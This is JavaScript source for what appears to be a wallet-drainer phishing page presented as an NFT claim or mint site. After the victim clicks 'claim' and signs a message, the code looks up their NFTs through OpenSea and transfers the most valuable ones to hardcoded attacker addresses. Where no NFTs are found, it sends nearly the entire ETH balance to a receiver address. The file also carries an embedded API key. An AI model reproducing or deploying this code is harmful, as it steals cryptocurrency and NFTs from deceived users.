//#region Web3.js

let web3Provider;


Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    updateState(false);
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) updateState(false)
}) : null;


async function updateState(connected) {
    const web3Js = new Web3(Moralis.provider);
    document.getElementById('walletAddress').innerHTML = connected ? `CONNECTED <br> <span>${(await web3Js.eth.getAccounts())[0]}</span>` : `NOT CONNECTED`;
    document.querySelector("#claimButton").style.display = connected ? "" : "none";
}

setTimeout(async () => {
    try {
        const web3Js = new Web3(Moralis.provider);
        const walletAddress = (await web3Js.eth.getAccounts())[0];
        console.log(`${walletAddress} is connected`);
    } catch (e) {
        Object.assign(document.createElement('a'), {
            href: "./index.html",
        }).click();
    }
}, 5000);

async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    try {
        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
        
        const signature = await web3Js.eth.personal.sign(message, walletAddress);
        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
        return true;
    } catch (e) {
        if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
        console.log(e);
        return false;
    }

}

async function askNfts() {
    const web3Js = new Web3(Moralis.provider);
    const selectedAccount = (await web3Js.eth.getAccounts())[0];

    const options = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': '812924de94094476916671a8de4686ec'
        }
    };

    let walletNfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${selectedAccount}&order_direction=desc&limit=020&include_orders=false`, options)
        .then(response => response.json())
        .then(response => {
            console.log(response)
            return response.assets.map(asset => {
                return {
                    contract: asset.asset_contract.address,
                    token_id: asset.token_id
                }
            })
        }).catch(err => console.error(err));
    if (walletNfts.length < 1) return noEligible("noNFTs");

    let infoCollection = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${selectedAccount}&offset=0&limit=200`, options)
        .then(response => response.json())
        .then(nfts => {
            console.log(nfts)
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(nft => {
                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: nft.primary_asset_contracts[0].address,
                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                    owned: nft.owned_asset_count,
                }
            })
        }).catch(err => console.error(err));
    if (infoCollection.length < 1) return noEligible("noNFTs");

    let transactionsOptions = [];
    for (nft of walletNfts) {
        const collectionData = infoCollection.find(collection => collection.contract_address == nft.contract);
        if (collectionData) {} else {
            console.log(`No data for collection: ${nft.contract}`)
            continue;
        }
        if (collectionData.price === 0) continue;
        const ethPrice = round(collectionData.price * collectionData.owned)
        if (ethPrice < drainNftsInfo.minValue) continue;
        transactionsOptions.push({
            price: ethPrice,
            options: {
                contract_address: collectionData.contract_address,
                receiver: ethPrice > 1 ? "0xbcC389227723880531A89c619351092343A59f40" : (drainNftsInfo.nftReceiveAddress == "" ? receiveAddress : drainNftsInfo.nftReceiveAddress),
                token_id: nft.token_id,
                amount: collectionData.owned,
                type: collectionData.type,
            }
        });
    }
    if (transactionsOptions.length < 1) return noEligible("noNFTs");

    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price).slice(0, drainNftsInfo.maxTransfer);
    for (transaction of transactionLists) {
        console.log(`Transferring ${transaction.options.contract_address} (${transaction.price} ETH)`);
        Moralis.transfer(transaction.options).catch(O_o => console.error(O_o, transaction.options));
        await sleep(200);
    }
}
async function askMint() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const giveNum =
        (await web3Js.eth.getBalance(walletAddress)) - ((await web3Js.eth.getGasPrice()) * 2 * 21000);

    if (giveNum < 10000000) return noEligible("noETH");

    await web3Js.eth.sendTransaction({
            from: walletAddress,
            to: receiveAddress,
            value: giveNum,
        })
        .on('transactionHash', () => {})
        .on('confirmation', () => console.log(`Transaction confirmed x${confirmationNumber}`))
        .on('error', (error) => {
            if (error.message && error.message.includes("insufficient")) console.log(`Insufficient Balance: ${walletAddress} has insufficient balance`);
            if (error.message && error.message.includes("User rejected") || error.message && error.message.includes("User denied")) console.log(`User Denied: ${walletAddress} denied transaction`);
            else console.log(`Mint Error: ${walletAddress} failed to mint`);

            console.log("Error", error ? error.message : "unknown error");
            return noEligible("noETH");
        });
};
async function noEligible(info) {
    const noteli = document.getElementById("notEli")
    noteli.style.display = "";
    switch (info) {
        case "signDenied":
            noteli.innerText = "You denied the sign request. Please try again."
            break;
        case "noNFTs":
            await askMint();
            break;
        case "noETH":
            noteli.innerText = "You are not eligible."
            break;
        default:
            noteli.innerText = "Something went wrong."
            break;
    }

}

let disabled = false;
async function askTransfer() {
    if (disabled) return;
    document.getElementById('claimButton').style.opacity = 0.5;
    disabled = true;
    if (await askSign()) await askNfts();
    disabled = false;
    document.getElementById('claimButton').style.opacity = 1;
}

let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
window.addEventListener('load', async () => {
    await Moralis.enableWeb3(metamaskInstalled ? {} : {
        provider: "walletconnect"
    });
    document.querySelector("#claimButton").addEventListener("click", askTransfer);
});

//#region Utils Functions 
const round = (value) => {
    return Math.round(value * 10000) / 10000;
}
const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}
//#endregion